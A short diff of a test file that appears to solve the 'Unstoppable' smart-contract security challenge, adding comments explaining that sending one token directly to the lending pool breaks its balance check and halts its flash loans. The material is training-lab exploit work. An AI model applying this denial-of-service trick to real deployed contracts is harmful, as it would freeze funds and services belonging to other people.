@@ -48,6 +48,9 @@ describe('[Challenge] Unstoppable', function () {
 
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
+		// Transfer 1 token to LenderPool to create an internal imbalance and make the assert
+		// requirement impossible to fulfill, since "poolBalance (1000000) == balanceBefore (1000001)"
+		// is false
 		await this.token.connect(attacker).transfer(this.pool.address, 1)
 	})
 
